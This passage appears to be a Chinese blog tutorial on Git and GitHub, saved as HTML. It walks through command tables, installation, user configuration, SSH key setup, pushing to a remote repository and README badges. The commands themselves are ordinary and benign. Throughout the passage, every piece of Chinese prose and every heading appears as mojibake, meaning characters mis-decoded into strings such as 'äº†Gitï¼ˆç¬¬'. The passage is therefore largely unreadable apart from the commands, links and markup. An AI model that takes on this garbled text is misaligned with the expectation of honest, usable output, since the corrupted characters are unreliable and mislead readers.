äº†Gitï¼ˆç¬¬ä¸€ä¸ªç‰ˆæœ¬ï¼‰ï¼Œå¹¶ä¸”å¼€æºç»™æ‰€æœ‰äººå…è´¹è¯•ç”¨ã€‚3å¹´åï¼ŒTom Prestonä½¿ç”¨Gitä½œä¸ºç‰ˆæœ¬æ§åˆ¶è½¯ä»¶åˆ›å»ºäº†<a href="http://Github.com" target="_blank" rel="noopener">http://Github.com</a> ï¼Œä¸€ä¸ªä¸“é—¨æ‰˜ç®¡ä»£ç å¹¶ä¸”å¯ä»¥å®ç°ç‰ˆæœ¬æ§åˆ¶çš„ç½‘ç«™ã€‚Tomä¹‹æ‰€ä»¥æŠŠç½‘ç«™å«åšGithubï¼Œæ˜¯å› ä¸ºå…¶æ ¸å¿ƒéƒ¨åˆ†ç‰ˆæœ¬æ§åˆ¶æ˜¯ç”¨Gitæ¥å¤„ç†çš„ã€‚ä½†æ˜¯ ä¸ºä»€ä¹ˆæœ‰äººå›å¤è°ƒä¾ƒGithubæ˜¯å…¨çƒæœ€å¤§ç”·æ€§äº¤å‹ç½‘ç«™å‘¢ï¼Ÿé‚£æ˜¯å› ä¸ºGithubçš„æ³¨å†Œç”¨æˆ·å¤§éƒ½æ˜¯ç”·ç”Ÿï¼Œè€Œä¸”å½¼æ­¤ä¹‹é—´å¯ä»¥ç›¸äº’å…³æ³¨ï¼ˆç±»ä¼¼äºå¾®åšï¼‰</p><h2 id="Gitæ¦‚è§ˆ"><a href="#Gitæ¦‚è§ˆ" class="headerlink" title="Gitæ¦‚è§ˆ"></a>Gitæ¦‚è§ˆ</h2><p>æ‰€æœ‰å‘½ä»¤å‰éƒ½è¦åŠ  <code>git</code>ï¼Œå¦‚è¡¨ä¸­çš„<code>init</code>æ˜¯æŒ‡ <code>git init</code>ã€‚<br> ç‚¹å‡»å‘½ä»¤å¯ç›´æ¥è·³è½¬è‡³æœ¬æ–‡ç¬¬ä¸€æ¬¡ä½¿ç”¨çš„åœ°æ–¹ã€‚<br><br>ä»¥ä¸‹å‘½ä»¤éƒ½åœ¨å‘½ä»¤è¡Œé‡Œæ‰§è¡Œã€‚</p><h3 id="1ã€ä¸ªäººæœ¬åœ°ä½¿ç”¨"><a href="#1ã€ä¸ªäººæœ¬åœ°ä½¿ç”¨" class="headerlink" title="1ã€ä¸ªäººæœ¬åœ°ä½¿ç”¨"></a>1ã€ä¸ªäººæœ¬åœ°ä½¿ç”¨</h3><table><thead><tr><th style="text-align:center">è¡Œä¸º</th><th style="text-align:center">å‘½ä»¤</th><th style="text-align:left">å¤‡æ³¨</th></tr></thead><tbody><tr><td style="text-align:center">åˆå§‹åŒ–</td><td style="text-align:center">init</td><td style="text-align:left">åœ¨æœ¬åœ°çš„å½“å‰ç›®å½•é‡Œåˆå§‹åŒ–gitä»“åº“</td></tr><tr><td style="text-align:center"></td><td style="text-align:center">clone [url]</td><td style="text-align:left">ä»ç½‘ç»œä¸ŠæŸä¸ªåœ°å€æ‹·è´ä»“åº“(repository)åˆ°æœ¬åœ°</td></tr><tr><td style="text-align:center">æŸ¥çœ‹å½“å‰çŠ¶æ€</td><td style="text-align:center">status</td><td style="text-align:left">æŸ¥çœ‹å½“å‰ä»“åº“çš„çŠ¶æ€ã€‚</td></tr><tr><td style="text-align:center">æŸ¥çœ‹ä¸åŒ</td><td style="text-align:center">diff</td><td style="text-align:left">æŸ¥çœ‹å½“å‰çŠ¶æ€å’Œæœ€æ–°çš„commitä¹‹é—´ä¸åŒçš„åœ°æ–¹</td></tr><tr><td style="text-align:center">æ·»åŠ æ–‡ä»¶</td><td style="text-align:center">add -A</td><td style="text-align:left">è¿™ç®—æ˜¯ç›¸å½“é€šç”¨çš„äº†ã€‚åœ¨commitä¹‹å‰è¦å…ˆadd</td></tr><tr><td style="text-align:center">æäº¤</td><td style="text-align:center">commit -m â€œæäº¤ä¿¡æ¯â€</td><td style="text-align:left">æäº¤ä¿¡æ¯æœ€å¥½èƒ½ä½“ç°æ›´æ”¹äº†ä»€ä¹ˆ</td></tr><tr><td style="text-align:center">æŸ¥çœ‹æäº¤è®°å½•</td><td style="text-align:center">log</td><td style="text-align:left">æŸ¥çœ‹å½“å‰ç‰ˆæœ¬åŠä¹‹å‰çš„commitè®°å½•</td></tr></tbody></table><h3 id="2ã€ä¸ªäººä½¿ç”¨è¿œç¨‹ä»“åº“"><a href="#2ã€ä¸ªäººä½¿ç”¨è¿œç¨‹ä»“åº“" class="headerlink" title="2ã€ä¸ªäººä½¿ç”¨è¿œç¨‹ä»“åº“"></a>2ã€ä¸ªäººä½¿ç”¨è¿œç¨‹ä»“åº“</h3><table><thead><tr><th style="text-align:center">è¡Œä¸º</th><th style="text-align:center">å‘½ä»¤</th><th style="text-align:left">å¤‡æ³¨</th></tr></thead><tbody><tr><td style="text-align:center">è®¾ç½®ç”¨æˆ·å</td><td style="text-align:center">config â€“global user.name â€œä½ çš„ç”¨æˆ·åâ€</td><td style="text-align:left"></td></tr><tr><td style="text-align:center">è®¾ç½®é‚®ç®±</td><td style="text-align:center">config â€“global user.email â€œä½ çš„é‚®ç®±â€</td><td style="text-align:left"></td></tr><tr><td style="text-align:center">ç”Ÿæˆssh key</td><td style="text-align:center">ssh-keygen -t rsa -C â€œä½ çš„é‚®ç®±â€</td><td style="text-align:left">è¿™æ¡å‘½ä»¤å‰é¢ä¸ç”¨åŠ git</td></tr><tr><td style="text-align:center">æ·»åŠ è¿œç¨‹ä»“åº“</td><td style="text-align:center">remote add origin ä½ å¤åˆ¶çš„åœ°å€</td><td style="text-align:left">è®¾ç½®origin</td></tr><tr><td style="text-align:center">ä¸Šä¼ å¹¶æŒ‡å®šé»˜è®¤</td><td style="text-align:center">push -u origin master</td><td style="text-align:left">æŒ‡å®šé»˜è®¤ä¸»æœºï¼Œä»¥åpushé»˜è®¤ä¸Šä¼ åˆ°originä¸Š</td></tr><tr><td style="text-align:center">æäº¤åˆ°è¿œç¨‹ä»“åº“</td><td style="text-align:center">push</td><td style="text-align:left">å°†å½“å‰åˆ†æ”¯å¢åŠ çš„commitæäº¤åˆ°è¿œç¨‹ä»“åº“</td></tr><tr><td style="text-align:center">ä»è¿œç¨‹ä»“åº“åŒæ­¥</td><td style="text-align:center">pull</td><td style="text-align:left">è·å–è¿œç¨‹ä»“åº“çš„commit</td></tr></tbody></table><p>å¯ä»¥ä½¿ç”¨ä¸€å¼ å›¾ç›´è§‚åœ°çœ‹å‡ºä»¥ä¸Šä¸»è¦å‘½ä»¤å¯¹ä»“åº“çš„å½±å“</p><p><img src="https://www.github.com/Qymua/bookmaker-data/raw/master/Qymua/006WtDzMgy1g2dspyxgk9j314a0qxjvu.jpg" alt></p><p>å›¾ç‰‡å¼•ç”¨è‡ªï¼š<a href="http://blog.podrezo.com/git-introduction-for-cvssvntfs-users/" target="_blank" rel="noopener">Git introduction for CVS/SVN/TFS users</a></p><p><img src="https://www.github.com/Qymua/bookmaker-data/raw/master/Qymua/006WtDzMgy1g2dsqvakjrj30ju06smxz.jpg" alt></p><p>å›¾ç‰‡å¼•ç”¨è‡ªï¼š<a href="http://www.liaoxuefeng.com/wiki/0013739516305929606dd18361248578c67b8067c8c017b000/0013745374151782eb658c5a5ca454eaa451661275886c6000" target="_blank" rel="noopener">å·¥ä½œåŒºå’Œæš‚å­˜åŒº - å»–é›ªå³°çš„å®˜æ–¹ç½‘ç«™</a> ï¼ˆåšäº†ç‚¹ä¿®æ”¹ï¼‰</p><p>å¯¹ç…§æŸ¥çœ‹ä¸¤å¼ å›¾ï¼š</p><blockquote><p>workspace å³å·¥ä½œåŒºï¼Œé€»è¾‘ä¸Šæ˜¯æœ¬åœ°è®¡ç®—æœºï¼Œè¿˜æ²¡æ·»åŠ åˆ°repositoryçš„çŠ¶æ€ï¼›<br>staging å³ç‰ˆæœ¬åº“ä¸­çš„stageï¼Œæ˜¯æš‚å­˜åŒºã€‚ä¿®æ”¹å·²ç»æ·»åŠ è¿›repositoryï¼Œä½†è¿˜æ²¡æœ‰ä½œä¸ºcommitæäº¤ï¼Œç±»ä¼¼äºç¼“å­˜ï¼›<br>Local repository å³ç‰ˆæœ¬åº“ä¸­masteré‚£ä¸ªåœ°æ–¹ã€‚åˆ°è¿™ä¸€æ­¥æ‰ç®—æ˜¯æˆåŠŸç”Ÿæˆä¸€ä¸ªæ–°ç‰ˆæœ¬ï¼›<br>Remote repository åˆ™æ˜¯è¿œç¨‹ä»“åº“ã€‚ç”¨æ¥å°†æœ¬åœ°ä»“åº“ä¸Šä¼ åˆ°ç½‘ç»œï¼Œå¯ä»¥ç”¨äºå¤‡ä»½ã€å…±äº«ã€åˆä½œã€‚æœ¬æ–‡å°†ä½¿ç”¨Githubä½œä¸ºè¿œç¨‹ä»“åº“çš„ä¾‹å­ã€‚</p></blockquote><h2 id="Git-å®‰è£…"><a href="#Git-å®‰è£…" class="headerlink" title="Git å®‰è£…"></a>Git å®‰è£…</h2><h3 id="Git-for-windows"><a href="#Git-for-windows" class="headerlink" title="Git for windows"></a>Git for windows</h3><p><img src="https://www.github.com/Qymua/bookmaker-data/raw/master/Qymua/006WtDzMgy1g2dss4kiwyj305v05u3yw.jpg" alt></p><p> å®‰è£…åŒ…å¯ä»¥åˆ°<a href="https://git-for-windows.github.io/" target="_blank" rel="noopener">å®˜æ–¹ç½‘ç«™</a>ä¸‹è½½ï¼Œæˆ–è€…åœ¨<a href="https://github.com/git-for-windows/git/releases" target="_blank" rel="noopener">github</a>ä¸‹è½½ã€‚å¦‚æœä¸‹è½½ä¸ä¸‹æ¥ï¼Œå¯ä»¥æŠŠé“¾æ¥å¤åˆ¶ä¸‹æ¥ç”¨è¿…é›·ä¸‹è½½ã€‚å¦‚æœç”¨è¿…é›·ä¸‹è½½ä¸æ”¾å¿ƒï¼Œåœ¨ä¸‹è½½å®Œåå»åœ¨githubä¸‹è½½çš„é‚£ä¸ªåœ°æ–¹æŸ¥çœ‹SHA-256å€¼ï¼Œå¹¶å’Œä¸‹è½½çš„æ–‡ä»¶å¯¹æ¯”ï¼Œå¦‚æœå€¼ä¸€æ ·å°±å¯ä»¥æ”¾å¿ƒä½¿ç”¨ã€‚<br><br> å®‰è£…çš„æ—¶å€™ä¸€è·¯ç‚¹å‡»<code>Next</code>å°±è¡Œäº†ã€‚<br><br> åˆšå®‰è£…å®Œæ‰“å¼€åï¼Œçª—å£æ¯”è¾ƒå°ã€‚å¦‚æœä¸å¤ªä¹ æƒ¯ï¼Œå¯ä»¥æŠŠå®ƒæ”¹å¤§ä¸€äº›ã€‚<br><br> 1ã€é¦–å…ˆç§»åˆ°çª—å£å³ä¸‹è§’è¾¹ç¼˜ï¼Œå‡ºç°ç®­å¤´åæŠŠçª—å£æ‹‰å¤§ã€‚<br> 2ã€ç‚¹å‡»çª—å£é¡¶éƒ¨å·¦è¾¹çš„å›¾æ ‡ -&gt; Optionsâ€¦ -&gt; Window -&gt; Current size -&gt; OK<br>     è¿™æ ·ä»¥åæ‰“å¼€çª—å£éƒ½ä¼šæ˜¯è°ƒæ•´åçš„å¤§å°ã€‚</p><blockquote><p>Git for Windowsä»<a href="https://github.com/git-for-windows/git/releases/tag/v2.8.0.windows.1" target="_blank" rel="noopener">2.8.0</a>ç‰ˆæœ¬å¼€å§‹ï¼Œé»˜è®¤æ·»åŠ ç¯å¢ƒå˜é‡ï¼Œæ‰€ä»¥ç¯å¢ƒå˜é‡éƒ¨åˆ†å°±ä¸ç”¨å†æ‰‹åŠ¨é…ç½®äº†ã€‚</p></blockquote><h3 id="Git-for-Linux"><a href="#Git-for-Linux" class="headerlink" title="Git for Linux"></a>Git for Linux</h3><p>Git çš„å·¥ä½œéœ€è¦è°ƒç”¨ curlï¼Œzlibï¼Œopensslï¼Œexpatï¼Œlibiconv ç­‰åº“çš„ä»£ç ï¼Œæ‰€ä»¥éœ€è¦å…ˆå®‰è£…è¿™äº›ä¾èµ–å·¥å…·ã€‚</p><p>åœ¨æœ‰ yum çš„ç³»ç»Ÿä¸Šï¼ˆæ¯”å¦‚ Fedoraï¼‰æˆ–è€…æœ‰ apt-get çš„ç³»ç»Ÿä¸Šï¼ˆæ¯”å¦‚ Debian ä½“ç³»ï¼‰ï¼Œå¯ä»¥ç”¨ä¸‹é¢çš„å‘½ä»¤å®‰è£…ï¼š</p><p>å„ Linux ç³»ç»Ÿå¯ä»¥ä½¿ç”¨å…¶å®‰è£…åŒ…ç®¡ç†å·¥å…·ï¼ˆapt-getã€yum ç­‰ï¼‰è¿›è¡Œå®‰è£…ï¼š</p><p><code>Debian/Ubuntu</code> Git å®‰è£…å‘½ä»¤ä¸ºï¼š</p><figure class="highlight q"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">$ apt-<span class="built_in">get</span> install libcurl4-gnutls-<span class="built_in">dev</span> libexpat1-<span class="built_in">dev</span> gettext \</span><br><span class="line">  libz-<span class="built_in">dev</span> libssl-<span class="built_in">dev</span></span><br><span class="line"></span><br><span class="line">$ apt-<span class="built_in">get</span> install git</span><br><span class="line"></span><br><span class="line">$ git --version</span><br><span class="line">git version <span class="number">1.8</span><span class="number">.1</span><span class="number">.2</span></span><br></pre></td></tr></table></figure><h3 id="ç”¨æˆ·ä¿¡æ¯é…ç½®"><a href="#ç”¨æˆ·ä¿¡æ¯é…ç½®" class="headerlink" title="ç”¨æˆ·ä¿¡æ¯é…ç½®"></a>ç”¨æˆ·ä¿¡æ¯é…ç½®</h3><p>é…ç½®ä¸ªäººçš„ç”¨æˆ·åç§°å’Œç”µå­é‚®ä»¶åœ°å€ï¼š</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ git<span class="built_in"> config </span>--global user.name <span class="string">"Qymua"</span></span><br><span class="line">$ git<span class="built_in"> config </span>--global user.email <span class="string">"test@Qymua.com"</span></span><br></pre></td></tr></table></figure><p>å¦‚æœç”¨äº† <strong>â€“global</strong> é€‰é¡¹ï¼Œé‚£ä¹ˆæ›´æ”¹çš„é…ç½®æ–‡ä»¶å°±æ˜¯ä½äºä½ ç”¨æˆ·ä¸»ç›®å½•ä¸‹çš„é‚£ä¸ªï¼Œä»¥åä½ æ‰€æœ‰çš„é¡¹ç›®éƒ½ä¼šé»˜è®¤ä½¿ç”¨è¿™é‡Œé…ç½®çš„ç”¨æˆ·ä¿¡æ¯ã€‚</p><p>å¦‚æœè¦åœ¨æŸä¸ªç‰¹å®šçš„é¡¹ç›®ä¸­ä½¿ç”¨å…¶ä»–åå­—æˆ–è€…ç”µé‚®ï¼Œåªè¦å»æ‰ â€“global é€‰é¡¹é‡æ–°é…ç½®å³å¯ï¼Œæ–°çš„è®¾å®šä¿å­˜åœ¨å½“å‰é¡¹ç›®çš„ .git/config æ–‡ä»¶é‡Œã€‚</p><h2 id="Git-for-github"><a href="#Git-for-github" class="headerlink" title="Git for github"></a>Git for github</h2><blockquote><p>åˆ°è¿™é‡Œè¡¨ç¤ºå·²ç»å¯ä»¥å¼€å§‹ä½¿ç”¨Gitä¸Šä¼ é¡¹ç›®åˆ°githubäº†</p></blockquote><h3 id="æ·»åŠ ssh-key"><a href="#æ·»åŠ ssh-key" class="headerlink" title="æ·»åŠ ssh key"></a>æ·»åŠ ssh key</h3><p>ç”±äºä½ çš„æœ¬åœ° Git ä»“åº“å’Œ GitHub ä»“åº“ä¹‹é—´çš„ä¼ è¾“æ˜¯é€šè¿‡SSHåŠ å¯†çš„ï¼Œæ‰€ä»¥æˆ‘ä»¬éœ€è¦é…ç½®éªŒè¯ä¿¡æ¯ï¼š</p><p>ä½¿ç”¨ä»¥ä¸‹å‘½ä»¤ç”Ÿæˆ SSH Keyï¼š</p><figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$ </span>ssh-keygen -t rsa -C <span class="string">"youremail@example.com"</span></span><br></pre></td></tr></table></figure><p>åé¢çš„<a href="mailto:*your_email@youremail.com" target="_blank" rel="noopener">*your_email@youremail.com</a>*æ”¹ä¸ºä½ åœ¨ Github ä¸Šæ³¨å†Œçš„é‚®ç®±ï¼Œä¹‹åä¼šè¦æ±‚ç¡®è®¤è·¯å¾„å’Œè¾“å…¥å¯†ç ï¼Œæˆ‘ä»¬è¿™ä½¿ç”¨é»˜è®¤çš„ä¸€è·¯å›è½¦å°±è¡Œã€‚æˆåŠŸçš„è¯ä¼šåœ¨ ~/ ä¸‹ç”Ÿæˆ .ssh æ–‡ä»¶å¤¹ï¼Œè¿›å»ï¼Œæ‰“å¼€ <strong>id_rsa.pub</strong>ï¼Œå¤åˆ¶é‡Œé¢çš„ <strong>key</strong>ã€‚</p><p>å›åˆ° github ä¸Šï¼Œè¿›å…¥ Account =&gt; Settingsï¼ˆè´¦æˆ·é…ç½®ï¼‰ã€‚</p><p><img src="https://www.github.com/Qymua/bookmaker-data/raw/master/Qymua/006WtDzMgy1g2dtfi2xtzj30gn08st9f.jpg" alt></p><p>å·¦è¾¹é€‰æ‹© <strong>SSH and GPG keys</strong>ï¼Œç„¶åç‚¹å‡» <strong>New SSH key</strong> æŒ‰é’®,title è®¾ç½®æ ‡é¢˜ï¼Œå¯ä»¥éšä¾¿å¡«ï¼Œç²˜è´´åœ¨ä½ ç”µè„‘ä¸Šç”Ÿæˆçš„ keyã€‚</p><p><img src="https://www.github.com/Qymua/bookmaker-data/raw/master/Qymua/006WtDzMgy1g2dtfz7z8dj30kr0djaaw.jpg" alt></p><p>æ·»åŠ æˆåŠŸåä¸ºäº†éªŒè¯æ˜¯å¦æˆåŠŸï¼Œè¾“å…¥ä»¥ä¸‹å‘½ä»¤ï¼š</p><figure class="highlight ada"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ ssh -T git@github.com</span><br><span class="line">Hi tianqixin! You<span class="symbol">'ve</span> successfully authenticated, but GitHub does <span class="keyword">not</span> provide shell <span class="keyword">access</span>.</span><br></pre></td></tr></table></figure><h3 id="æ–°å»ºä»“åº“"><a href="#æ–°å»ºä»“åº“" class="headerlink" title="æ–°å»ºä»“åº“"></a>æ–°å»ºä»“åº“</h3><p>è¿™é‡Œä¸å†è¯´æ˜å¦‚ä½•åˆ›å»ºäº†ï¼Œåªä»‹ç»ä¸‹ç›¸åº”é€‰é¡¹çš„ç”¨é€”</p><p>Repository name: ä»“åº“åç§°</p><p>Description(å¯é€‰): ä»“åº“æè¿°ä»‹ç»</p><p>Public, Private : ä»“åº“æƒé™ï¼ˆå…¬å¼€å…±äº«ï¼Œç§æœ‰æˆ–æŒ‡å®šåˆä½œè€…ï¼‰</p><p>Initialize this repository with a README: æ·»åŠ ä¸€ä¸ªREADME.md</p><p>gitignore: ä¸éœ€è¦è¿›è¡Œç‰ˆæœ¬ç®¡ç†çš„ä»“åº“ç±»å‹ï¼Œå¯¹åº”ç”Ÿæˆæ–‡ä»¶.gitignore</p><p>license: è¯ä¹¦ç±»å‹ï¼Œå¯¹åº”ç”Ÿæˆæ–‡ä»¶LICENSE<br>â€‹</p><h3 id="å¼€å§‹ä¸Šä¼ "><a href="#å¼€å§‹ä¸Šä¼ " class="headerlink" title="å¼€å§‹ä¸Šä¼ "></a>å¼€å§‹ä¸Šä¼ </h3><p> 1ã€åœ¨æœ¬åœ°åˆ›å»ºä¸€ä¸ªç‰ˆæœ¬åº“ï¼ˆå³æ–‡ä»¶å¤¹ï¼‰ï¼Œé€šè¿‡git initæŠŠå®ƒå˜æˆGitä»“åº“ï¼›</p><p> 2ã€æŠŠé¡¹ç›®å¤åˆ¶åˆ°è¿™ä¸ªæ–‡ä»¶å¤¹é‡Œé¢ï¼Œå†é€šè¿‡<code>git add .</code>æŠŠé¡¹ç›®æ·»åŠ åˆ°ä»“åº“ï¼›</p><p> 3ã€å†é€šè¿‡git commit -m â€œæ³¨é‡Šå†…å®¹â€æŠŠé¡¹ç›®æäº¤åˆ°ä»“åº“ï¼›</p><p> 4ã€é€šè¿‡git remote add origin <a href="https://github.com/ç”¨æˆ·å/é¡¹ç›®å.git" target="_blank" rel="noopener">https://github.com/ç”¨æˆ·å/é¡¹ç›®å.git</a> å°†æœ¬åœ°ä»“åº“å’Œè¿œç¨‹ä»“åº“è¿›è¡Œå…³è”ï¼›</p><p> 5ã€æœ€åé€šè¿‡git push -u origin masteræŠŠæœ¬åœ°ä»“åº“çš„é¡¹ç›®æ¨é€åˆ°è¿œç¨‹ä»“åº“ï¼ˆä¹Ÿå°±æ˜¯Githubï¼‰ä¸Šï¼›</p><p> <em>ç”±äºæ–°å»ºçš„è¿œç¨‹ä»“åº“æ˜¯ç©ºçš„ï¼Œæ‰€ä»¥è¦åŠ ä¸Š-uè¿™ä¸ªå‚æ•°ï¼Œç­‰è¿œç¨‹ä»“åº“é‡Œé¢æœ‰äº†å†…å®¹ä¹‹åï¼Œä¸‹æ¬¡å†ä»æœ¬åœ°åº“ä¸Šä¼ å†…å®¹çš„æ—¶å€™åªéœ€ä¸‹é¢è¿™æ ·å°±å¯ä»¥äº†ï¼š</em></p><figure class="highlight maxima"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ git <span class="built_in">push</span> <span class="built_in">origin</span> master</span><br></pre></td></tr></table></figure><p>ï¼ˆè‹¥æ–°å»ºè¿œç¨‹ä»“åº“çš„æ—¶å€™è‡ªåŠ¨åˆ›å»ºäº†READMEæ–‡ä»¶ä¼šæŠ¥é”™ï¼Œè§£å†³åŠæ³•çœ‹ä¸‹é¢ï¼‰ã€‚</p><p> è¿™æ˜¯ç”±äºä½ æ–°åˆ›å»ºçš„é‚£ä¸ªä»“åº“é‡Œé¢çš„READMEæ–‡ä»¶ä¸åœ¨æœ¬åœ°ä»“åº“ç›®å½•ä¸­ï¼Œè¿™æ—¶æˆ‘ä»¬å¯ä»¥é€šè¿‡ä»¥ä¸‹å‘½ä»¤å…ˆå°†å†…å®¹åˆå¹¶ä»¥ä¸‹ï¼š</p><figure class="highlight ada"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ git pull <span class="comment">--rebase origin master</span></span><br></pre></td></tr></table></figure><h3 id="å·¥ä½œåŒºè¿ç§»"><a href="#å·¥ä½œåŒºè¿ç§»" class="headerlink" title="å·¥ä½œåŒºè¿ç§»"></a>å·¥ä½œåŒºè¿ç§»</h3><p>1ã€åœ¨æ–°ç¯å¢ƒä¸‹é…ç½®å¥½Gitï¼›</p><p>2ã€é€šè¿‡git initæŠŠå®ƒå˜æˆGitä»“åº“ï¼›</p><p>3ã€git clone [url] å…‹éš†ä»“åº“åˆ°æœ¬åœ°ï¼›</p><p>4ã€git add . æ·»åŠ é¡¹ç›®åˆ°ä»“åº“ï¼ˆç¼“å­˜åŒºï¼‰ï¼›</p><p>5ã€é€šè¿‡git remote add origin <a href="https://github.com/ç”¨æˆ·å/é¡¹ç›®å.git" target="_blank" rel="noopener">https://github.com/ç”¨æˆ·å/é¡¹ç›®å.git</a> å°†æœ¬åœ°ä»“åº“å’Œè¿œç¨‹ä»“åº“è¿›è¡Œå…³è”ï¼›</p><p>6ã€å…¶å®åˆ°è¿™é‡Œå·²ç»è¿ç§»å®Œæˆï¼Œä¸»è¦æ˜¯ä¸‹è½½åˆ°æœ¬åœ°ï¼Œæ·»åŠ Gitä»“åº“åï¼Œå†æŠŠé¡¹ç›®åŒæ­¥åˆ°æœ¬åœ°ä»“åº“ä¸Š</p><h2 id="æ‹“å±•"><a href="#æ‹“å±•" class="headerlink" title="æ‹“å±•"></a>æ‹“å±•</h2><p><strong>change time:2019-6-29</strong><br>è¿‘æœŸä¸ºäº†ä½¿ç”¨gitbookå†™ç”µå­ä¹¦ï¼Œå¼€å§‹é‡æ–°æ¥è§¦github pagesã€github badgeï¼Œä¹Ÿå› æ­¤ä¸å†å°†æœ¬åšå®¢æ‰˜ç®¡è‡³githubï¼Œåªæ‰˜ç®¡äºcoding</p><h3 id="github-pages"><a href="#github-pages" class="headerlink" title="github pages"></a>github pages</h3><p><a href="https://pages.github.com/" target="_blank" rel="noopener">https://pages.github.com/</a><br>æ„Ÿè§‰æ•™ç¨‹ä¹Ÿå¾ˆå¤šï¼Œæ²¡ä»€ä¹ˆç»†èŠ‚æ“ä½œ,å°±ä¸å¤šåºŸè¯äº†,éœ€è¦çš„æ—¶å€™æŠ˜è…¾ä¸‹ï¼Œä¸åšå¼€å‘ä¸æ˜¯å¾ˆéœ€è¦è¿™ä¹ˆè§„èŒƒ</p><h3 id="github-badge"><a href="#github-badge" class="headerlink" title="github badge"></a>github badge</h3><p>å•çº¯ä¸ºäº†å¥½çœ‹çš„ï¼Œæ²¡ç”¨å®é™…ç”¨é€”<br>ç”¨ä¸€äº›é€šç”¨çš„å°å›¾æ ‡æ¥æè¿°é¡¹ç›®ç›¸å…³ä¿¡æ¯ç¡®å®ä¸å¤±ä¸ºä¸€ç§å¾ˆæ£’çš„é€‰æ‹©</p><p>GitHub é¡¹ç›®çš„ README.md ä¸­å¯ä»¥æ·»åŠ å¾½ç« ï¼ˆBadgeï¼‰å¯¹é¡¹ç›®è¿›è¡Œæ ‡è®°å’Œè¯´æ˜ï¼Œè¿™äº›å¥½çœ‹çš„å°å›¾æ ‡ä¸ä»…ç®€æ´ç¾è§‚ï¼Œè€Œä¸”è¿˜åŒ…å«äº†æ¸…æ™°æ˜“è¯»çš„ä¿¡æ¯ã€‚<br>å¾½æ ‡ä¸»è¦ç”±å›¾ç‰‡å’Œå¯¹åº”çš„é“¾æ¥ï¼ˆå½“ç„¶ï¼Œä½ å¯ä»¥ä¸å¡«ï¼‰ç»„æˆï¼Œå¾½æ ‡å›¾ç‰‡çš„è¯ä¸€èˆ¬ç”±å·¦åŠéƒ¨åˆ†çš„åç§°å’Œå³åŠéƒ¨åˆ†çš„å€¼ç»„æˆã€‚</p><p><img src="https://www.github.com/Qymua/bookmaker-data/raw/master/Qymua/1561791715257.png" alt></p><p>GitHub å¾½æ ‡çš„å®˜æ–¹ç½‘ç«™æ˜¯ <a href="https://shields.io/" target="_blank" rel="noopener">shields.io</a><br>ä¾‹å¦‚ï¼šè‡ªå®šä¹‰å¾½æ ‡</p><figure class="highlight dust"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="xml">https://img.shields.io/badge/</span><span class="template-variable">&#123;å¾½æ ‡æ ‡é¢˜&#125;</span><span class="xml">-</span><span class="template-variable">&#123;å¾½æ ‡å†…å®¹&#125;</span><span class="xml">-</span><span class="template-variable">&#123;å¾½æ ‡é¢œè‰²&#125;</span><span class="xml">.svg</span></span><br></pre></td></tr></table></figure><p><img src="https://www.github.com/Qymua/bookmaker-data/raw/master/Qymua/1561791942639.png" alt></p><h2 id="æœ¬æ–‡æ¶‰åŠçš„æœ¯è¯­"><a href="#æœ¬æ–‡æ¶‰åŠçš„æœ¯è¯­" class="headerlink" title="æœ¬æ–‡æ¶‰åŠçš„æœ¯è¯­"></a>æœ¬æ–‡æ¶‰åŠçš„æœ¯è¯­</h2><ul><li>Version Controlï¼ˆç‰ˆæœ¬æ§åˆ¶ï¼‰:ä»»ä½•ä¸€ä¸ªèƒ½å¤Ÿè®©ä½ äº†è§£æ–‡ä»¶çš„å†å²ï¼Œä»¥åŠè¯¥æ–‡ä»¶çš„å‘å±•è¿›ç¨‹çš„ç³»ç»Ÿã€‚</li><li>Gitï¼šä¸€ä¸ªç‰ˆæœ¬æ§åˆ¶ç¨‹åºï¼Œé€šè¿‡å¯¹å˜æ›´è¿›è¡Œæ³¨é‡Šï¼Œä»¥åˆ›å»ºä¸€ä¸ªæ˜“äºéå†çš„ç³»ç»Ÿå†å²ã€‚</li><li>Commitï¼ˆæäº¤ï¼‰ï¼šåœ¨æŒ‡å®šæ—¶é—´ç‚¹å¯¹ç³»ç»Ÿå·®å¼‚è¿›è¡Œçš„æ³¨é‡Š â€œå¿«ç…§â€ã€‚</li><li>Localï¼ˆæœ¬åœ°ï¼‰ï¼šæŒ‡ä»»æ„æ—¶åˆ»å·¥ä½œæ—¶æ­£åœ¨ä½¿ç”¨çš„ç”µè„‘ã€‚</li><li>Remoteï¼ˆè¿œç¨‹ï¼‰ï¼š æŒ‡æŸä¸ªè”ç½‘çš„ä½ç½®ã€‚</li><li>Repository (ä»“åº“ï¼Œç®€ç§° repo)ï¼šé…ç½®äº†Gitè¶…çº§æƒé™çš„ç‰¹å®šæ–‡ä»¶å¤¹ï¼ŒåŒ…å«äº†ä½ çš„é¡¹ç›®æˆ–ç³»ç»Ÿç›¸å…³çš„æ‰€æœ‰æ–‡ä»¶ã€‚</li><li>Githubï¼šè·å–æœ¬åœ°æäº¤å†å²è®°å½•ï¼Œå¹¶è¿›è¡Œè¿œç¨‹å­˜å‚¨ï¼Œä»¥ä¾¿ä½ å¯ä»¥ä»ä»»ä½•è®¡ç®—æœºè®¿é—®è¿™äº›è®°å½•ã€‚</li><li>Pushingï¼ˆæ¨é€ï¼‰ï¼šå–å¾—æœ¬åœ°Gitæäº¤ï¼ˆä»¥åŠç›¸å…³çš„æ‰€æœ‰å·¥ä½œï¼‰ï¼Œç„¶åå°†å…¶ä¸Šä¼ 